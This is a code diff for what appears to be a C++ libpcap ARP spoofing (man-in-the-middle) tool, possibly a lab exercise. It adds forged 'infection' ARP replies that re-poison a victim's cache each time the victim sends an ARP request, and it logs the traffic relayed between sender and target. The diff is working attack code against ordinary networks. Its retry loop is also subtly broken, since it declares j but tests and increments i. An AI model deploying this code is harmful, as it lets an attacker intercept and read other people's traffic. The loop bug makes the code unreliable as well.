@@ -168,6 +168,7 @@ int main(int argc, char* argv[]) {
 
 	// recover all.
 	RecoverArpTables(dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList);
+	printf("ARP table recoverd.\n");
 
 	return 0;
 }
@@ -483,6 +484,8 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 	while (!g_SIGINT_flag)
 	{
 		sleep(0);
+		const int nRetry = 10;
+		const int uLatency = 500000;
 		const u_char* rawRecv;
 		res = pcap_next_ex(handle, &header, &rawRecv);
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
@@ -505,11 +508,48 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 				 && pktEthArp->arp_.sip_ == SenderIpList_.at(i)
 				 && pktEthArp->arp_.tmac_ == Mac().nullMac()
 				 && pktEthArp->arp_.tip_ == TargetIpList_.at(i)){
-					if ((pktEthArp->eth_.dmac_ == MyMac_)){
-						// @Todo1: send single ARP reply packet.
-					}
-					else if (pktEthArp->eth_.dmac_ == Mac().broadcastMac()){
-						// @Todo2: send multiple or lazy ARP reply packets.
+					if ((pktEthArp->eth_.dmac_ == MyMac_) || pktEthArp->eth_.dmac_ == Mac().broadcastMac()){
+						EthArpPacket pktSmartInfect;
+						pktSmartInfect.eth_.smac_ = MyMac_;
+						pktSmartInfect.eth_.dmac_ = SenderMacList_.at(i);
+						pktSmartInfect.eth_.type_ = htons(EthHdr::Arp);
+						pktSmartInfect.arp_.hrd_ = htons(ArpHdr::ETHER);
+						pktSmartInfect.arp_.pro_ = htons(EthHdr::Ip4);
+						pktSmartInfect.arp_.hln_ = Mac::SIZE;
+						pktSmartInfect.arp_.pln_ = Ip::SIZE;
+						pktSmartInfect.arp_.op_ = htons(ArpHdr::Reply);
+						pktSmartInfect.arp_.smac_ = MyMac_;
+						pktSmartInfect.arp_.sip_ = htonl(TargetIpList_.at(i));
+						pktSmartInfect.arp_.tmac_ = SenderMacList_.at(i);
+						pktSmartInfect.arp_.tip_ = htonl(SenderIpList_.at(i));
+
+						if (pktEthArp->eth_.dmac_ == MyMac_){
+							// @Todo1 Not expired: ARP request from sender, unicast to me.
+							printf("\n@@@@@ Todo1 @@@@@\n\n");
+							res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktSmartInfect), header->caplen);
+							if (res != 0) {
+								fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+								pcap_close(handle);
+								return;
+							}
+							break;
+						}
+						else{
+							// @Todo2 Expired: ARP request from sender, broadcast.
+							// Send multiple infection packet after target's ARP packet.
+							printf("\n@@@@@ Todo2 @@@@@\n\n");
+							usleep(uLatency);
+							for (int j = 0; i < nRetry; i++){
+								res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktSmartInfect), header->caplen);
+								if (res != 0) {
+									fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+									pcap_close(handle);
+									return;
+								}
+							}
+							break;
+						}
+
 					}
 				}
 			}
@@ -536,7 +576,9 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 						fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
 						pcap_close(handle);
 						return;
-					}				
+					}
+					printf("relay: sender -> me -> target\nsrcIp=%s\ndstIp=%s\n\n",
+					 std::string(Ip(pktSrcIp)).c_str(), std::string(Ip(pktDstIp)).c_str());
 					break;
 				}
 		
@@ -555,6 +597,8 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 						pcap_close(handle);
 						return;
 					}
+					printf("relay: target -> me -> sender\nsrcIp=%s\ndstIp=%s\n\n",
+					 std::string(Ip(pktSrcIp)).c_str(), std::string(Ip(pktDstIp)).c_str());
 					break;
 				}
 			}
@@ -638,6 +682,7 @@ void RecoverArpTables(const char* deviceName_, Mac MyMac_,
  */
 void SigintHandler(int SIGNUM_){
 	printf("\nSIGINT captured, joining threads...\n");
+	printf("Trigger ARP table recover function.\n");
 	g_SIGINT_flag = true;
 	return;
 }
